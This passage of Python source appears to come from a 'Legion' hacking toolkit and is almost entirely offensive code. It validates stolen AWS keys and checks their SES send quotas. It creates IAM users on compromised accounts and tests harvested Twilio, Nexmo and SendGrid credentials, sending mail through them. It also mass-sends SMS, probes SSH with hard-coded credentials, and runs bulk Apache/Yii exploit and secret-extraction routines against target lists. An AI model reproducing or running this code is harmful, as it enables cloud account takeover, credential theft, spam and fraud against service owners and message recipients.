                        open('AWS_Results/login.txt', 'a').write('STATUS        : CAN CREATE USER\nACCOUNT ID    : '+str(asu[4])+'\nIAM USERNAME  : '+str(created_user['User']['UserName'])+'\nPASSWORD      : '+str(snoopdog)+'\n\n')
                    else:
                        print((f'{red}[{cy}FAILED{res}]{gr}─{res}[{mg}/{gr}+ {red}AWS BAD CREDENTIALS{mg}/{res}]'))
                except Exception as e:
                    print((f'{red}[{cy}FAILED{res}]{gr}─{res}[{mg}/{gr}+ {red}AWS BAD CREDENTIALS{mg}/{res}]'))
                pass

            def kirimi(usere,anune,dadine):
                try:
                    AWS_ACCESS_KEY = usere
                    AWS_SECRET_KEY = anune
                    AWS_REGION = dadine
                    client = boto3.client('ses',region_name=AWS_REGION,aws_access_key_id=AWS_ACCESS_KEY,aws_secret_access_key=AWS_SECRET_KEY)
                    asu = client.get_send_quota()
                    y = json.dumps(asu)
                    x = json.loads(y)
                    if 'Max24HourSend' in x:
                        print((f"{fc}[{gr}{AWS_ACCESS_KEY}{red}|{res}{AWS_SECRET_KEY}{red}|{res}{AWS_REGION}{fc}] {yl}LIMIT {gr}{str(x['Max24HourSend'])}"))
                        open('AWS_Results/goodaws.txt', 'a').write(AWS_ACCESS_KEY+'|'+AWS_SECRET_KEY+'|'+AWS_REGION+'|' 'Limit => '+str(x['Max24HourSend'])+'\n')
                        goblok(AWS_ACCESS_KEY,AWS_SECRET_KEY,AWS_REGION)
                        response = client.list_identities(
                            IdentityType='EmailAddress',
                            MaxItems=123,
                            NextToken='',
                            )
                        for a in response['Identities']:
                            print((f"{fc}[{res}{AWS_ACCESS_KEY}{red}|{res}{AWS_SECRET_KEY}{red}|{yl}{str(a)}{fc}]"))
                            open('AWS_Results/smtpses.txt', 'a').write('email-smtp.'+AWS_REGION+'.amazonaws.com|587|'+AWS_ACCESS_KEY+'|'+AWS_SECRET_KEY+'|'+a+'|'+str(x['Max24HourSend'])+'\n')
                            kirimawsses(AWS_REGION,AWS_ACCESS_KEY,AWS_SECRET_KEY,a,emailnow)
                            atsmtp(AWS_ACCESS_KEY,AWS_SECRET_KEY,AWS_REGION,a,x['Max24HourSend'])
                    else:
                        print((f"{fc}[{res}{AWS_ACCESS_KEY}{red}|{res}{AWS_SECRET_KEY}{red}|{res}{AWS_REGION}{fc}]{red} BAD"))
                    # Display an error if something goes wrong.\t
                except Exception as e:
                    print((f"{fc}[{res}{AWS_ACCESS_KEY}{red}|{res}{AWS_SECRET_KEY}{red}|{res}{AWS_REGION}{fc}]{red} BAD"))
                    print(("InfO : "+e))
                pass
            TONY = timer()
            Lista = input(f'{red}┌─{res}[{cy}Legion SMTP{res}]{gr}─{res}[{mg}/{gr}Give me your AWS {fc}List{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}')
            #legion = input(f'{red}┌─{res}[{cy}Legion SMTP{res}]{gr}─{res}[{mg}/{gr}Give me your {fc}EMAIL{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}')
            pubg = input(f'{red}┌─{res}[{cy}Legion SMTP{res}]{gr}─{res}[{mg}/{gr}Give me your {fc}AWS Name{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}')
            snoopdog = input(f'{red}┌─{res}[{cy}Legion SMTP{res}]{gr}─{res}[{mg}/{gr}Give me your {fc}AWS PASS{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}')
            master = open(Lista, 'r').readlines()
            for i in master:
                try:
                    site = i.strip()
                    bagi = site.split("|")
                    kirimi(bagi[0],bagi[1],bagi[2])
                except:
                    pass
            print(('TIME TAKE: ' + str(timer() - TONY) + ' S'))
        elif choice == "11":
            try:
            	os.mkdir('Twilio_Checker')
            except:
            	pass
            link = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP \033[32;1m+ \033[31;1mTWILIO\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#')
            with open(link) as fp:
                for star in fp:
                    check = star.rstrip()
                    ch = check.split('\n')[0].split('|')
                    account_sid = ch[0]
                    auth_token = ch[1]
                    auth = (account_sid, auth_token)
                    try:
                        curler_balance = requests.get("https://api.twilio.com/2010-04-01/Accounts/"+account_sid+"/Balance.json", auth=auth).text
                        curler_msg = requests.get("https://api.twilio.com/2010-04-01/Accounts/" + account_sid + "/Messages.json", auth=auth).text
                        info_balance = json.loads(curler_balance)
                        info_msg = json.loads(curler_msg)
                        for msg in info_msg["messages"]:
                            if msg["direction"] == "outbound-api":
                                nope = msg["from"]
                                break
                            elif msg["direction"] == "inbound-api":
                                nope = msg["to"]
                                break
                        print(f"\033[32;1m┌─\033[0;1m[\033[32;1mTWILIO CHECKER\033[0;1m]{res}\n\t{gr}└─╼{res}[{gr}LIVE{res}]\n{gr}└─╼{res}[{gr}{curler_balance}{res}]")
                        build = "- "+account_sid+"|"+auth_token+'\n'+"Balance :"+info_balance["balance"]+'\n'+"Phone number: "+nope+'\n'
                        remover = build.replace('\r', '')
                        save = open('Twilio_Checker/!Twilio_Valid.txt', 'a')
                        save.write(remover+'\n')
                        save.close()
                        legiontwilio(account_sid,auth_token)
                    except:
                           print (f"\033[31;1m┌─\033[31;1m[\033[32;1mTWILIO CHECKER\033[31;1m]{res}\n\t{red}└─╼{res}[{red}DEAD{res}]\n{red}└─╼{cy}{account_sid}|{red}{auth_token}{res}")
                           pass
        elif choice == "12":
            try:
            	os.mkdir('Result')
            except:
            	pass
            link = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP \033[32;1m+ \033[31;1mNEXMO\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#')
            with open(link) as fp:
                for star in fp:
                    try:
                        check = star.rstrip()
                        ch = check.split('\n')[0].split('|')
                        Key = ch[0]
                        Sec = ch[1]
                        client = vonage.Client(key=Key, secret=Sec)
                        result = client.get_balance()
                        print(f"\033[32;1m┌─\033[0;1m[\033[32;1mNEXMO CHECKER\033[0;1m]{res}\n{gr}└─╼{res}[{gr}Working API!{res}]\n\t{gr}└─╼{res}[{yl} {Key}|{Sec} Balance : {result['value']:0.2f} EUR{res}]\n")
                        open("Result/!Valid_Nexmo_Api.txt", "a").write(f"{Key}|{Sec} Balance: {result['value']:0.2f} EUR\n")
                    except:
                        print(f"\033[31;1m┌─\033[31;1m[\033[33;1mNEXMO CHECKER\033[31;1m]{res}\n{red}└─╼{res}[{red}DEAD{res}]\n\t{red}└─╼{cy}{Key}|{Sec}{res}\n")
                        pass
        elif choice == "13":
            try:
            	os.mkdir('Result')
            except:
            	pass
            link = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP \033[32;1m+ \033[31;1mSENDGRID\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#')
            address = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP \033[32;1m+ \033[31;1mSENDGRID\033[31;1m]--\033[31;1m[\033[32;1mGive me your Email\033[31;1m]\n└─╼\033[32;1m#')
            with open(link) as fp:
                for star in fp:
                    if not star:
                       pass
                    try:
                        star = star.rstrip()
                        ch = star.split('\n')[0].split('|')
                        user = ch[0]
                        pwd = ch[1]
                        url = user+' | '+pwd
                        headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0',
                        'Authorization': 'Bearer '+pwd,
                        }
                        result = requests.get('https://api.sendgrid.com/v3/user/credits',headers=headers,timeout=15).content
                        x = json.loads(result)
                        if 'reset_frequency' in x:
                            getemail = requests.get('https://api.sendgrid.com/v3/user/email',headers=headers,timeout=15).json()
                            print(f"\033[31;1m┌─\033[31;1m[\033[33;1mSENDGRID CHECKER\033[31;1m]{res}\n--------------LEGION SMTP CRACK {ble}Sendgrid Api{res} Checker------------\n")
                            print(f"\033[31;1m┌─\033[31;1m[\033[33;1mSENDGRID CHECKER\033[31;1m]{res}\n{gr}#{res} {gr}{url} {gr}=> VALID KEY!{res}\n")
                            print(f"\033[31;1m┌─\033[31;1m[\033[33;1mSENDGRID CHECKER\033[31;1m]{res}\nLimit: {yl}{x['total']}{res} Used: {yl}{x['used']}{res} Reset: {yl}{x['reset_frequency']}{res} From Mail: {yl}{getemail['email']}{yl}\n--------------------------------\n\n")
                            open('Result/!Sendgrid_ValidKey.txt', 'a').write(f"-------Legion SMTP Cracker, Sendgrid Api Checker-----\n{url}\nLimit: {x['total']} Used: {x['used']} Reset: {x['reset_frequency']} From Mail: {getemail['email']}\n--------------------------------\n\n")
                            print(f"Trying To Sending..")
                            serveraddr = 'smtp.sendgrid.net'
                            toaddr = address
                            fromaddr = getemail['email']
                            serverport = 587
                            smtp_user = user
                            smtp_pass = pwd
                            now = strftime("%Y-%m-%d %H:%M:%S")
                            addr2 = emailnow
                            msg = "From: %s\r\nTo: %s\r\nSubject: !legion_Sendgrid_Checker %s|%s|%s|%s\r\n\r\nTest message from Legion smtp crack sent at %s" % (
                            fromaddr, toaddr, serveraddr, serverport, smtp_user, smtp_pass, now)
                            server = smtplib.SMTP()
                            try:
                                server.connect(serveraddr, serverport)
                                server.login(smtp_user, smtp_pass)
                                server.sendmail(fromaddr, toaddr, msg)
                                server.sendmail(fromaddr, addr2, msg)
                                print(f"\t\033[31;1m┌─\033[31;1m[\033[33;1mSENDGRID CHECKER\033[31;1m]{res}\n\t{red}└─╼{res}[{gr}EMAIL SENT TO{res} {address}]\n\t{red}└─╼{cy}{url}{res}\n")
                                open('Result/!Sendgrid_able_tosend.txt', 'a').write(f"{user}|{pwd}\n")
                                server.quit()

                            except:
                                print(f"\t\033[31;1m┌─\033[31;1m[\033[33;1mSENDGRID CHECKER\033[31;1m]{res}\n\t{red}└─╼{res}[{cy}FAILED SEND EMAIL{res}]\n\t{red}└─╼{cy}{url}{res}\n")
                                pass

                        else:
                            print(f"\t\033[31;1m┌─\033[31;1m[\033[33;1mSENDGRID CHECKER\033[31;1m]{res}\n\t{red}└─╼{res}[{red}BAD KEY{res}]\n\t{red}└─╼{cy}{url}{res}\n")
                            pass
                    except:
                        print(f"\t\033[31;1m┌─\033[31;1m[\033[33;1mSENDGRID CHECKER\033[31;1m]{res}\n\t{red}└─╼{res}[{red}BAD KEY{res}]\n\t{red}└─╼{cy}{url}{res}\n")
                        pass
            fp.close()
        elif choice == '14':
            Targetssas = input("\033[32m With Thread?|\033[0m \033[36m[\033[33my\033[36m]\033[31m/\033[36m[\033[33mn\033[36m] ")
            if Targetssas == "y":
                jumlahkn = input("\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#")
                Leakix(jumlahkn)
        elif choice == "15":
            try:
            	os.mkdir('Reverse')
            except:
            	pass
            getips()
            lists = open('ipos.txt', 'r').read().split('\n')
            mp = 100
            pp = Pool(int(mp))
            pp.map(ranga, lists)
        elif choice == "16":
            getips()
        elif choice == "17":
            SMTPTESTER()
        elif choice == "18":
            try:
            	os.mkdir('CMS')
            except:
            	pass
            try:
                list = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP \033[32;1m+ \033[31;1mDEBUG\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#')
                lists = open(list, 'r').read().split('\n')
                print('''
                    1.MultiProcessing
                    2.ThreadPool
                ''')
                chosethrd = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Choice\033[31;1m]\n└─╼\033[32;1m#')
                if chosethrd == '1':
                    mp = input('\t\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    pp = Pool(int(mp))
                    pp.map(filter2, lists)
                else:
                    thrdmp = input('\033[31;1m┌─\033[31;1m[\033[36;1mLegion & BadBoy\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    for listss in lists:
                        with ThreadPoolExecutor(max_workers=int(thrdmp)) as executor:
                            executor.submit(filter2, listss)
            except:
                print('{}Wrong'.format(fr))
        elif choice == "19":
            try:
            	os.mkdir('Ipgen')
            except:
            	pass
            try:
                list = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP \033[32;1m+ \033[31;1mDEBUG\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#')
                lists = open(list, 'r').read().split('\n')
                print(f'''
                    {red}1{res}.{yl}MultiProcessing {res}[{gr}Fast{res}]
                    {red}2{res}.{yl}ThreadPool {res}[{red}Normal{res}]
                ''')
                chosethrd = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Choice\033[31;1m]\n└─╼\033[32;1m#')
                if chosethrd == '1':
                    mp = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    pp = Pool(int(mp))
                    pp.map(MyLove, lists)
                else:
                    thrdmp = input('\t\033[31;1m┌─\033[31;1m[\033[36;1mLegion & BadBoy\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n\t└─╼\033[32;1m#')
                    for listss in lists:
                        with ThreadPoolExecutor(max_workers=int(thrdmp)) as executor:
                            executor.submit(MyLove, listss)
            except:
                print('{}Wrong'.format(fr))
        elif choice == "20":
            progres = 0

            with open(MESSAGE_FILE, 'r') as content_file:
                sms = content_file.read()

            # Check we read a message OK
            if len(sms.strip()) == 0:
                print("SMS message not specified- please make a {}' file containing it. \r\nExiting!".format(MESSAGE_FILE))
                sys.exit(1)
            else:
                print(" \n\n{}".format(sms))

            # How many segments is this message going to use?
            segments = int(len(sms.encode('utf-8')) / SMS_LENGTH) +1

            # Open the people CSV and get all the numbers out of it
            with open(CSV_FILE, 'r') as csvfile:
                peoplereader = csv.reader(csvfile)
                numbers = set([p[0] for p in peoplereader]) # remove duplicate numbers


            # Calculate how much it's going to cost:
            messages = len(numbers)
            cost = MSG_COST * segments * messages

            print("".format(messages, segments, cost))
            banner =f"""
                            {red}    ___       __      _______               ______                _____
                {cy}               __ |     / /_____ ___    |___{red}PRIV8{res}\033[36m     ___  / _____ _______ ____(_)______ _______
                {yl}               __ | /| / / _  _ \__  /| |__  ___/_  _ \__  /  _  _ \__  __ `/__  / _  __ \__  __ $
                {res}               __ |/ |/ /  /  __/_  ___ |_  /    /  __/_  /___/  __/_  /_/ / _  /  / /_/ /_  / / /
                            {red}   ____/|__/   \___/ /_/  |_|/_/     \___/ /_____/\___/ _\__, /  /_/   \____/ /_/ /_/
                                                                                    /____/

            """
            print (banner)
            print (f"""
            \t{gr}PERSONAL SMS Sender V2.0
            \t{fc}───┬───────────────
            \t   {fc}└╼ {red}Total SMS {fc}[{gr}{messages}{fc}]
            \t{fc}───┬────────────────
            \t   {fc}└╼ {red}Cost Messages will be {fc}[{gr}${cost}{fc}]
            \t{fc}───┬────────────────
            \t   {fc}└╼ {red}Message to send {fc}[{gr}{sms}{fc}]
            """)
            # Check you really want to send them
            confirm = input("Send these messages? [Y/n] ")
            if confirm[0].lower() == 'y':
                # Set up Twilio client
                client = Client(twilioapi, twiliotoken)

                # Send the messages
                for num in numbers:
                    # Send the sms text to the number from the CSV file:
                    progres = progres + 1
                    print(f"{fc}[{gr}{str(progres)}{fc}] {yl}Sending to {gr}" + num)
                    message = client.messages.create(to=num, from_=from_num, body=sms)

            print("Exiting!")
        elif choice == "21":

            def l3gion(target, username, password):
            	try:
            		targetIP = gethostbyname(target)
            	except:
            		print(f'{yl}╰╼[{red}INVALID {yl}IP{yl}] {fc}╾─╼{res} '+str(target))
            		return False
            	for i in [22]:
            		s = socket(AF_INET, SOCK_STREAM)
            		s.settimeout(0.5)
            		result = s.connect_ex((targetIP, i))
            		if(result == 0) :
            			checkssh(targetIP, 22, username, password)
            		else:
            			print(f'{yl}╰╼[{red}PORT{gr}| {yl}'+str(i)+f' {gr}|{red}CLOSED{yl}]{res} '+targetIP)
            		s.close()

            def checkssh(ip, port, username, password):
            	cmd = 'cat /proc/cpuinfo | grep processor'
            	try:
            		ssh=paramiko.SSHClient()
            		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            		ssh.connect(ip,port,'systemd','JancoxSc0de', timeout=5)
            		stdin,stdout,stderr=ssh.exec_command(cmd)
            		outlines=stdout.readlines()
            		cpu = 0
            		for asu in outlines:
            			cpu = cpu + 1
            		build = str(ip) + '|' + str(port) + '|' + str(username) + '|' + str(password) + ' - CPU '+str(cpu)
            		print(f'{yl}╰╼[{gr}LIVE{yl}] {fc}╾─╼{gr} '+str(build))
            		save = open('sshlive.txt','a')
            		save.write(build+'\n')
            		save.close()
            	except KeyboardInterrupt:
            		print('Cenceled by user')
            	except Exception as err:
            		build = str(ip) + '|' + str(port) + '|' + str(username) + '|' + str(password)
            		print(f'{yl}╰╼[{red}DIE{yl}] {fc}╾─╼{res} '+str(build))

            try:
                listip = open(input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP \033[32;1m+ \033[31;1mDEBUG\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#')).read()

            except:
            	print(f'{red}Something wrong{yl}!{res}')
            	exit()
            for wearelegion in listip.splitlines():
            	prepare = wearelegion.split('|')
            	try:
            		if "://" in prepare[0]:
            			host = prepare[0].split('://')[1]
            		else:
            			host = prepare[0]
            		user = prepare[3]
            		password = prepare[4]


            	except:
            		continue
            	l3gion(host, user, password)
        elif choice == "22":
            try:
            	os.mkdir('Checker')
            except:
            	pass
            try:
                list = input('\t\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP \033[32;1m+ \033[31;1mDEBUG\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n\t└─╼\033[32;1m#')
                lists = open(list, 'r').read().split('\n')
                print('''
                    1.MultiProcessing
                    2.ThreadPool
                ''')
                chosethrd = input('\t\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Choice\033[31;1m]\n\t└─╼\033[32;1m#')
                if chosethrd == '1':
                    mp = input('\t\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n\t└─╼\033[32;1m#')
                    pp = Pool(int(mp))
                    pp.map(Legionip, lists)
                else:
                    thrdmp = input('\t\033[31;1m┌─\033[31;1m[\033[36;1mLegion & BadBoy\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n\t└─╼\033[32;1m#')
                    for listss in lists:
                        with ThreadPoolExecutor(max_workers=int(thrdmp)) as executor:
                            executor.submit(Legionip, listss)
            except:
                print('{}Wrong'.format(fr))
        elif choice == "23":
            try:
            	os.mkdir('Legion_AWS')
            except:
            	pass
            mainola()
        elif choice == "24":
            try:
            	os.mkdir('Legion_AWS')
            except:
            	pass
            mainalla()
        elif choice == "25":
            try:
            	os.mkdir('Smtp_Tester')
            except:
            	pass
            sites = open(input(f'{red}┌─{res}[{cy}Legion SMTP{res}]{gr}─{res}[{mg}/{gr}Give me your SMTP List{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}'), 'r').read().splitlines()
            try:
                with concurrent.futures.ThreadPoolExecutor(100) as executor:
                    executor.map(tester, sites)
            except Exception as e:
                print(e)
        elif choice == "26":
            try:
            	os.mkdir('CMS')
            except:
            	pass
            try:
                readcfg = ConfigParser()
                readcfg.read(pid_restore)
                lists = readcfg.get('DB', 'FILES')
                numthread = readcfg.get('DB', 'THREAD')
                sessi = readcfg.get('DB', 'SESSION')
                print("log session bot found! restore session")
                print('''Using Configuration :\n\tFILES='''+lists+'''\n\tTHREAD='''+numthread+'''\n\tSESSION='''+sessi)
                tanya = input("Want to contineu session ? [Y/n] ")
                if "Y" in tanya or "y" in tanya:
                    lerr = open(lists).read().split("\n"+sessi)[1]
                    readsplit = lerr.splitlines()
                else:
                    kntl # Send Error Biar Lanjut Ke Wxception :v
            except:
                try:
                    lists = sys.argv[1]
                    numthread = sys.argv[2]
                    readsplit = open(lists).read().splitlines()
                except:
                    try:
                        lists = input("\033[31;1m┌─\033[31;1m[\033[36;1mLegion Priv8\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#")
                        readsplit = open(lists).read().splitlines()
                    except:
                        print("Wrong input or list not found!")
                        exit()
                    try:
                        numthread = input("\033[31;1m┌─\033[31;1m[\033[36;1mLegion Priv8\033[31;1m]--\033[31;1m[\033[32;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#")
                    except:
                        print("Wrong thread number!")
                        exit()
            pool = ThreadPool(int(numthread))
            for url in readsplit:
                if "://" in url:
                    url = url
                else:
                    url = "http://"+url
                if url.endswith('/'):
                    url = url[:-1]
                jagases = url
                try:
                    pool.add_task(EXPLOIT, url)
                except KeyboardInterrupt:
                    session = open(pid_restore, 'w')
                    cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\n"
                    session.write(cfgsession)
                    session.close()
                    print("CTRL+C Detect, Session saved")
                    exit()
            pool.wait_completion()
            try:
                os.remove(pid_restore)
            except:
                pass
        elif choice == "27":

            Bad = 0
            Good = 0
            def Folder(result):
              if not os.path.exists(result):
                os.makedirs(result)
            Folder("ASN")
            def clear():
                try:
                    if os.name == 'nt':
                        os.system('cls')
                    else:
                        os.system('clear')
                except:
                    pass
            def exploiter(i) :
                ASN = i
                r = requests.get(f"https://api.bgpview.io/asn/{ASN}/prefixes").json()
                rather = r['data']['ipv4_prefixes']
                for Yh in range(0, int(len(rather)) - 1):
                    IPM = r['data']['ipv4_prefixes'][Yh]
                    Jahl = IPM['ip'] + '/' + str(IPM['cidr'])
                    IPL = ipranges.IP4Net(Jahl)
                    for IP in IPL:
                        open('ASN/IP_ASN.txt', 'a', errors='ignore', encoding='utf-8').write(f"{IP}\n")
                        print(f"{gr}{IP}")
                #   except Exception as e:
                    try:
                        pass
                    finally:
                        e = None
                        del e

            done = False
            #here is the animation
            def animate():
                for c in itertools.cycle(['|', '/', '-', '\\']):
                    if done:
                        break
                    sys.stdout.write('\rloading ' + c)
                    sys.stdout.flush()
                    time.sleep(0.1)
                sys.stdout.write('\rDone!     ')



            def process(line):
                time.sleep(1)


            def run() :
                text = """

             ___       __      _______               ______                _____
             __ |     / /_____ ___    |___           ___  / _____ _______ ____(_)______ _______
             __ | /| / / _  _ \__  /| |__  ___/_  _ \__  /  _  _ \__  __ `/__  / _  __ \__  __ $
             __ |/ |/ /  /  __/_  ___ |_  /    /  __/_  /___/  __/_  /_/ / _  /  / /_/ /_  / / /
             ____/|__/   \___/ /_/  |_|/_/     \___/ /_____/\___/ _\__, /  /_/   \____/ /_/ /_/
                                                                                      /____/
                 ▄▄▄· .▄▄ ·  ▐ ▄     ▪   ▄▄▄·     ▄▄ • ▄▄▄   ▄▄▄· ▄▄▄▄· ▄▄▄▄· ▄▄▄ .▄▄▄
                ▐█ ▀█ ▐█ ▀. •█▌▐█    ██ ▐█ ▄█    ▐█ ▀ ▪▀▄ █·▐█ ▀█ ▐█ ▀█▪▐█ ▀█▪▀▄.▀·▀▄ █·
                ▄█▀▀█ ▄▀▀▀█▄▐█▐▐▌    ▐█· ██▀·    ▄█ ▀█▄▐▀▀▄ ▄█▀▀█ ▐█▀▀█▄▐█▀▀█▄▐▀▀▪▄▐▀▀▄
                ▐█ ▪▐▌▐█▄▪▐███▐█▌    ▐█▌▐█▪·•    ▐█▄▪▐█▐█•█▌▐█ ▪▐▌██▄▪▐███▄▪▐█▐█▄▄▌▐█•█▌
                 ▀  ▀  ▀▀▀▀ ▀▀ █▪    ▀▀▀.▀       ·▀▀▀▀ .▀  ▀ ▀  ▀ ·▀▀▀▀ ·▀▀▀▀  ▀▀▀ .▀  ▀
            """[1:]
                System.Clear()
                print("\n"*2)
                print(Colorate.Horizontal(Colors.green_to_red, Center.XCenter(text)))
                print("\n"*5)
                file_name = Write.Input(f"Give me your ASN List:", Colors.green_to_yellow, interval=0.005)
                op = open(file_name,'r').read().splitlines()
                TEXTList = [list.strip() for list in op]
                p = Pool(int(Write.Input("Thread ? ", Colors.green_to_yellow, interval=0.005)))
                p.map(exploiter, TEXTList)




            run()
        elif choice == "0":
            printez()
            alege()


def printezapache():
    print(f'''
{red}------- \033[32mLegion Apache Menu{red} -------
{fc}───┬───────────────
   {fc}└╼ {red}[{gr}1{red}] {gr}APACHE {fc}[{red}EXPLOIT {yl}V{yl}5.1{fc}] {fc}Grab From Mix List{res} {gr}[NEW Version]
   {fc}└╼ {red}[{gr}2{red}] {gr}Yii DEBUGGER {fc}[{red}EXPLOIT {yl}V{yl}5.1{fc}] {fc}Grab From Mix List{res} {mg}[NEW Private]
   {fc}└╼ {red}[{gr}3{red}] {gr}APACHE {fc}[{red}CMS {yl}FILTER{fc}] {fc}[{gr}AUTO{fc}]
   {fc}└╼ {red}[{gr}4{red}] {gr}APACHE {fc}[{red}AUTO ADD {yl}HTTP / HTTPS{fc}]
   {fc}└╼ {red}[{gr}5{red}] {gr}FRAMEWORK \033[0mMass \033[32mIP Grab \033[31mfrom \033[36mLeakix
   {fc}└╼ {red}[{gr}6{red}] {gr}APACHE {fc}[{red}Extract {yl}AWS{fc}] {fc}[{gr}NEW{fc}]
   {fc}└╼ {red}[{gr}7{red}] {gr}APACHE {fc}[{red}Extract {yl}TWILIO{fc}] {fc}[{gr}NEW{fc}]
   {fc}└╼ {red}[{gr}8{red}] {gr}APACHE {fc}[{red}Extract {yl}SENDGRID{fc}] {fc}[{gr}NEW{fc}]
   {fc}└╼ {red}[{gr}9{red}] {gr}APACHE AWS {fc}[{red}Auto add Region {gr}+ {yl}Send valid AWS to your email{fc}] {fc}[{gr}NEW{fc}]
    ''')
def apache():
    while True:
        print(f'{red}┌─{res}[{cy}Legion Priv8{res}]{gr}─{res}[{mg}/{gr}Alege o {fc}Optiune{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}',end='')
        choice = input('')
        if choice == "1":
            try:
                os.mkdir('Result(Apache)')
            except:
                pass
            try:
                os.mkdir('Result(Apache)/Manual')
            except:
                pass
            try:
            	os.mkdir('AWS_ByPass')
            except:
            	pass
            try:
            	readcfg = ConfigParser()
            	readcfg.read(pid_restore)
            	lists = readcfg.get('DB', 'FILES')
            	numthread = readcfg.get('DB', 'THREAD')
            	sessi = readcfg.get('DB', 'SESSION')
            	print("log session bot found! restore session")
            	print('''Using Configuration :\n\tFILES='''+lists+'''\n\tTHREAD='''+numthread+'''\n\tSESSION='''+sessi)
            	tanya = input("Want to contineu session ? [Y/n] ")
            	if "Y" in tanya or "y" in tanya:
            		lerr = open(lists).read().split("\n"+sessi)[1]
            		readsplit = lerr.splitlines()
            	else:
            		kntl # Send Error Biar Lanjut Ke Wxception :v
            except:
            	try:
            		lists = sys.argv[1]
            		numthread = sys.argv[2]
            		readsplit = open(lists).read().splitlines()
            	except:
            		try:
            			lists = input("\033[31;1m┌─\033[31;1m[\033[36;1mLegion Priv8\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#")
            			readsplit = open(lists).read().splitlines()
            		except:
            			print("Wrong input or list not found!")
            			exit()
            		try:
            			numthread = input("\033[31;1m┌─\033[31;1m[\033[36;1mLegion Priv8\033[31;1m]--\033[31;1m[\033[32;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#")
            		except:
            			print("Wrong thread number!")
            			exit()
            pool = ThreadPool(int(numthread))
            for url in readsplit:
            	if "://" in url:
            		url = url
            	else:
            		url = url
            	if url.endswith('/'):
            		url = url[:-1]
            	jagases = url
            	try:
            		pool.add_task(legalegion2, url)
            	except KeyboardInterrupt:
            		session = open(pid_restore, 'w')
            		cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\n"
            		session.write(cfgsession)
            		session.close()
            		print("CTRL+C Detect, Session saved")
            		exit()
            pool.wait_completion()
            try:
            	os.remove(pid_restore)
            except:
            	pass
        elif choice == "2":
            try:
                os.mkdir('Result(Yii)')
            except:
                pass
            try:
                os.mkdir('Result(Yii)/Manual')
            except:
                pass
            try:
            	os.mkdir('AWS_ByPass')
            except:
            	pass
            try:
                readcfg = ConfigParser()
                readcfg.read(pid_restore)
                lists = readcfg.get('DB', 'FILES')
                numthread = readcfg.get('DB', 'THREAD')
                sessi = readcfg.get('DB', 'SESSION')
                print("log session bot found! restore session")
                print('''Using Configuration :\n\tFILES='''+lists+'''\n\tTHREAD='''+numthread+'''\n\tSESSION='''+sessi)
                tanya = raw_input("Want to contineu session ? [Y/n] ")
                if "Y" in tanya or "y" in tanya:
                    lerr = open(lists).read().split("\n"+sessi)[1]
                    readsplit = lerr.splitlines()
                else:
                    kntl # Send Error Biar Lanjut Ke Wxception :v
            except:
                try:
                    lists = sys.argv[1]
                    numthread = sys.argv[2]
                    readsplit = open(lists).read().splitlines()
                except:
                    try:
                        lists = input("\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#")
                        readsplit = open(lists).read().splitlines()
                    except:
                        print("\tWrong input or list not found!")
                        exit()
                    try:
